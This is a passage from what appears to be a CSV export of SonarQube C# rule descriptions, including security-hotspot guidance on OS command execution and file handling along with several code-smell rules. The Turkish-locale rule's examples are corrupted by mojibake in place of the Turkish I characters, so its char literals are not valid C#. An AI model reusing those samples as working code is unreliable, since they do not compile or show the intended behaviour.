</pre>",csharpsquid:S2737,cs,C#,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string s = """";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e)  // Noncompliant
{
  throw;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string s = """";
try
{
  s = File.ReadAllText(fileName);
}
catch (Exception e) // Compliant
{
  logger.LogError(e);
  throw;
}
</pre>
<p>or</p>
<pre>
string s = File.ReadAllText(fileName);
</pre>
<h2>Exceptions</h2>
<p>This rule will not generate issues for <code>catch</code> blocks with just <code>throw</code> inside if they are followed by a <code>catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
var s = """"
try
{
    s = File.ReadAllText(fileName);
}
catch (IOException) // Compliant, if removed will change the logic
{
    throw;
}
catch (Exception)  // Compliant, does more than just rethrow
{
    logger.LogError(e);
    throw;
}
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2018-11-29T11:10:36+0100,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
using System.Security;
using System.Diagnostics;

namespace N
{
    class A
    {
        public void Foo(string fileName, string arguments, string userName, SecureString password, string domain,
                        ProcessStartInfo startInfo, Process process)
        {
            Process.Start(fileName); // Questionable
            Process.Start(fileName, arguments); // Questionable
            Process.Start(fileName, userName, password, domain); // Questionable
            Process.Start(fileName, arguments, userName, password, domain); // Questionable

            Process.Start(startInfo); // Ok, the ProcessStartInfo's FileName has already been highlighted elsewhere

            startInfo.FileName = fileName; // Questionable
            process.StartInfo.FileName = fileName; // Questionable. StartInfo is a ProcessStartInfo.

            new ProcessStartInfo(fileName); // Questionable
            new ProcessStartInfo(fileName, arguments); // Questionable
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",csharpsquid:S4721,cs,C#,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>Questionable Code Example</h2>
<pre>
using System.Security;
using System.Diagnostics;

namespace N
{
    class A
    {
        public void Foo(string fileName, string arguments, string userName, SecureString password, string domain,
                        ProcessStartInfo startInfo, Process process)
        {
            Process.Start(fileName); // Questionable
            Process.Start(fileName, arguments); // Questionable
            Process.Start(fileName, userName, password, domain); // Questionable
            Process.Start(fileName, arguments, userName, password, domain); // Questionable

            Process.Start(startInfo); // Ok, the ProcessStartInfo's FileName has already been highlighted elsewhere

            startInfo.FileName = fileName; // Questionable
            process.StartInfo.FileName = fileName; // Questionable. StartInfo is a ProcessStartInfo.

            new ProcessStartInfo(fileName); // Questionable
            new ProcessStartInfo(fileName, arguments); // Questionable
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2017-06-22T07:35:06+0200,"<p>Certain characters, once normalized to lowercase, cannot make a round trip. That is, they can not be converted from one locale to another and then
accurately restored to their original characters.</p>
<p>It is therefore strongly recommended to normalize characters and strings to uppercase instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo(""tr-TR"");
var areStringEqual = ""INTEGER"".ToLower() == ""integer""; // Noncompliant, the result is false as the ToLower will resolve to ""Ã„Â±nteger""
var areCharEqual = char.ToLower('I') == 'i'; // Noncompliant, the result is false as the ToLower will resolve to ""Ã„Â±""

var incorrectRoundtrip = ""Ã„Â°"".ToLowerInvariant().ToUpper() == ""I"".ToLowerInvariant().ToUpper(); // Noncompliant, because of the lower we lose the information about the correct uppercase character
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo(""tr-TR"");
var areStringEqual = ""Ã„Â±nteger"".ToUpperInvariant() == ""Ã„Â±NTEGER"";
var areCharEqual = char.ToUpperInvariant('Ã„Â±') == 'Ã„Â±';
var correctRoundtrip = ""Ã„Â°"".ToUpperInvariant().ToLower() != ""I"".ToUpperInvariant().ToLower();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://www.i18nguy.com/unicode/turkish-i18n.html"">Internationalization for Turkish</a> </li>
  <li> <a href=""https://gingter.org/2018/07/10/how-to-correctly-normalize-strings-and-how-to-compare-them-in-net/"">How to correctly normalize
  strings</a> </li>
  <li> [Best Practices for Using Strings in .NET|
  https://docs.microsoft.com/en-us/dotnet/standard/base-types/best-practices-strings#recommendations-for-string-usage] </li>
</ul>",csharpsquid:S4040,cs,C#,"<p>Certain characters, once normalized to lowercase, cannot make a round trip. That is, they can not be converted from one locale to another and then
accurately restored to their original characters.</p>
<p>It is therefore strongly recommended to normalize characters and strings to uppercase instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo(""tr-TR"");
var areStringEqual = ""INTEGER"".ToLower() == ""integer""; // Noncompliant, the result is false as the ToLower will resolve to ""Ã„Â±nteger""
var areCharEqual = char.ToLower('I') == 'i'; // Noncompliant, the result is false as the ToLower will resolve to ""Ã„Â±""

var incorrectRoundtrip = ""Ã„Â°"".ToLowerInvariant().ToUpper() == ""I"".ToLowerInvariant().ToUpper(); // Noncompliant, because of the lower we lose the information about the correct uppercase character
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread.CurrentThread.CurrentCulture = new CultureInfo(""tr-TR"");
var areStringEqual = ""Ã„Â±nteger"".ToUpperInvariant() == ""Ã„Â±NTEGER"";
var areCharEqual = char.ToUpperInvariant('Ã„Â±') == 'Ã„Â±';
var correctRoundtrip = ""Ã„Â°"".ToUpperInvariant().ToLower() != ""I"".ToUpperInvariant().ToLower();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://www.i18nguy.com/unicode/turkish-i18n.html"">Internationalization for Turkish</a> </li>
  <li> <a href=""https://gingter.org/2018/07/10/how-to-correctly-normalize-strings-and-how-to-compare-them-in-net/"">How to correctly normalize
  strings</a> </li>
  <li> [Best Practices for Using Strings in .NET|
  https://docs.microsoft.com/en-us/dotnet/standard/base-types/best-practices-strings#recommendations-for-string-usage] </li>
</ul>",Strings should be normalized to uppercase,[],MINOR,['pitfall'],CODE_SMELL
2017-04-14T12:33:18+0200,"<p>A method or class with too many type parameters has likely aggregated too many responsibilities and should be split.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default parameter value of 2:</p>
<pre>
&lt;S, T, U, V&gt; void foo() {} // Noncompliant; not really readable
&lt;String, Integer, Object, String&gt;foo(); // especially on invocations
</pre>",csharpsquid:S2436,cs,C#,"<p>A method or class with too many type parameters has likely aggregated too many responsibilities and should be split.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default parameter value of 2:</p>
<pre>
&lt;S, T, U, V&gt; void foo() {} // Noncompliant; not really readable
&lt;String, Integer, Object, String&gt;foo(); // especially on invocations
</pre>",Types and methods should not have too many generic parameters,"[{'key': 'max', 'htmlDesc': 'Maximum authorized number of generic parameters.', 'defaultValue': '2', 'type': 'INTEGER'}, {'key': 'maxMethod', 'htmlDesc': 'Maximum authorized number of generic parameters for methods.', 'defaultValue': '3', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2017-07-07T12:23:25+0200,"<p>When a base type explicitly implements a public interface method, that method is only accessible in derived types through a reference to the
current instance (namely <code>this</code>). If the derived type explicitly overrides that interface method, the base implementation becomes
inaccessible.</p>
<p>This rule raises an issue when an unsealed, externally visible type provides an explicit method implementation of a <code>public interface</code>
and does not provide an alternate, externally visible method with the same name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod() // Noncompliant
    {
        MyMethod();
    }

    void MyMethod()
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Can't access base.MyMethod()
        // ((IMyInterface)this).MyMethod() would be a recursive call
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod()
    {
        MyMethod();
    }

    protected void MyMethod() // or public
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Do something
        base.MyMethod();
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not report a violation for an explicit implementation of <code>IDisposable.Dispose</code> when an externally visible
<code>Close()</code> or <code>System.IDisposable.Dispose(Boolean)</code> method is provided.</p>",csharpsquid:S4039,cs,C#,"<p>When a base type explicitly implements a public interface method, that method is only accessible in derived types through a reference to the
current instance (namely <code>this</code>). If the derived type explicitly overrides that interface method, the base implementation becomes
inaccessible.</p>
<p>This rule raises an issue when an unsealed, externally visible type provides an explicit method implementation of a <code>public interface</code>
and does not provide an alternate, externally visible method with the same name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod() // Noncompliant
    {
        MyMethod();
    }

    void MyMethod()
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Can't access base.MyMethod()
        // ((IMyInterface)this).MyMethod() would be a recursive call
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{
    void MyMethod();
}

public class Foo : IMyInterface
{
    void IMyInterface.MyMethod()
    {
        MyMethod();
    }

    protected void MyMethod() // or public
    {
        // Do something ...
    }
}

public class Bar : Foo, IMyInterface
{
    public void MyMethod()
    {
        // Do something
        base.MyMethod();
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not report a violation for an explicit implementation of <code>IDisposable.Dispose</code> when an externally visible
<code>Close()</code> or <code>System.IDisposable.Dispose(Boolean)</code> method is provided.</p>",Interface methods should be callable by derived types,[],CRITICAL,['pitfall'],CODE_SMELL
2017-06-02T13:36:45+0200,"<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
{
  new ArgumentException(""x must be nonnegative"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
{
  throw new ArgumentException(""x must be nonnegative"");
}
</pre>",csharpsquid:S3984,cs,C#,"<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0)
{
  new ArgumentException(""x must be nonnegative"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0)
{
  throw new ArgumentException(""x must be nonnegative"");
}
</pre>",Exception should not be created without being thrown,[],MAJOR,['error-handling'],BUG
2018-11-29T11:10:36+0100,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Security.AccessControl;
using System.IO.Compression;
using System.IO.IsolatedStorage;
using System.IO.MemoryMappedFiles;

// Use interop to call the CreateFile function.
// For more information about CreateFile,
// see the unmanaged MSDN reference library.
[DllImport(""kernel32.dll"", SetLastError = true, CharSet=CharSet.Unicode)]
static extern SafeFileHandle CreateFile(string lpFileName, uint dwDesiredAccess,
uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
uint dwFlagsAndAttributes, IntPtr hTemplateFile);


// Review any static method call of File and Directory
File.Exists(""test.txt""); // Questionable
Directory.Exists(""test""); // Questionable

// Review any instantiation of FileInfo and DirectoryInfo and check how they are used
new FileInfo(""test.txt""); // Questionable
new DirectoryInfo(""test""); // Questionable

// Review the creation of SafeFileHandle and how it is used.
SafeFileHandle handle = CreateFile(...) // Questionable
new SafeFileHandle(IntPtr.Zero, false); // Questionable

// Questionable: review the creation of FileStream and other Streams accepting a file path.
new FileStream(""test.txt"", FileMode.Create);

new StreamWriter(""test.txt"", ...); // Questionable
new StreamReader(""test.txt"", ...); // Questionable

// Review those two methods as they create file and directories.
Path.GetTempFileName(); // Questionable
Path.GetTempPath(); // Questionable

new FileSecurity(""test.txt"", AccessControlSections.All); // Questionable

// Review all calls to static methods of ZipFile as they create file and/or directories
ZipFile.CreateFromDirectory(""test.txt"", ""test.zip""); // Questionable

// Review all calls to static methods of IsolatedStorageFile
IsolatedStorageFile.GetMachineStoreForApplication(); // Questionable

// Review all instantiation of IsolatedStorageFileStream and how they are used
new IsolatedStorageFileStream(""test.txt"", ...); // Questionable

// Review all Create* and Open* static methods of MemoryMappedFile and how the resulting file is used
MemoryMappedFile.CreateFromFile(""test.txt""); // Questionable
</pre>
<h2>Exceptions</h2>
<p>The creation of <code>FileStream</code> from a <code>SafeFileHandle</code> won't raise an issue as the creation of <code>SafeFileHandle</code>
already raised one.</p>
<p>Only the creation of <code>StreamWriter</code> or <code>StreamReader</code> from a string path will raise an issue for the same reason.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4797,cs,C#,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Security.AccessControl;
using System.IO.Compression;
using System.IO.IsolatedStorage;
using System.IO.MemoryMappedFiles;

// Use interop to call the CreateFile function.
// For more information about CreateFile,
// see the unmanaged MSDN reference library.
[DllImport(""kernel32.dll"", SetLastError = true, CharSet=CharSet.Unicode)]
static extern SafeFileHandle CreateFile(string lpFileName, uint dwDesiredAccess,
uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
uint dwFlagsAndAttributes, IntPtr hTemplateFile);


// Review any static method call of File and Directory
File.Exists(""test.txt""); // Questionable
Directory.Exists(""test""); // Questionable

// Review any instantiation of FileInfo and DirectoryInfo and check how they are used
new FileInfo(""test.txt""); // Questionable
new DirectoryInfo(""test""); // Questionable

// Review the creation of SafeFileHandle and how it is used.
SafeFileHandle handle = CreateFile(...) // Questionable
new SafeFileHandle(IntPtr.Zero, false); // Questionable

// Questionable: review the creation of FileStream and other Streams accepting a file path.
new FileStream(""test.txt"", FileMode.Create);

new StreamWriter(""test.txt"", ...); // Questionable
new StreamReader(""test.txt"", ...); // Questionable

// Review those two methods as they create file and directories.
Path.GetTempFileName(); // Questionable
Path.GetTempPath(); // Questionable

new FileSecurity(""test.txt"", AccessControlSections.All); // Questionable

// Review all calls to static methods of ZipFile as they create file and/or directories
ZipFile.CreateFromDirectory(""test.txt"", ""test.zip""); // Questionable

// Review all calls to static methods of IsolatedStorageFile
IsolatedStorageFile.GetMachineStoreForApplication(); // Questionable

// Review all instantiation of IsolatedStorageFileStream and how they are used
new IsolatedStorageFileStream(""test.txt"", ...); // Questionable

// Review all Create* and Open* static methods of MemoryMappedFile and how the resulting file is used
MemoryMappedFile.CreateFromFile(""test.txt""); // Questionable
</pre>
<h2>Exceptions</h2>
<p>The creation of <code>FileStream</code> from a <code>SafeFileHandle</code> won't raise an issue as the creation of <code>SafeFileHandle</code>
already raised one.</p>
<p>Only the creation of <code>StreamWriter</code> or <code>StreamReader</code> from a string path will raise an issue for the same reason.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
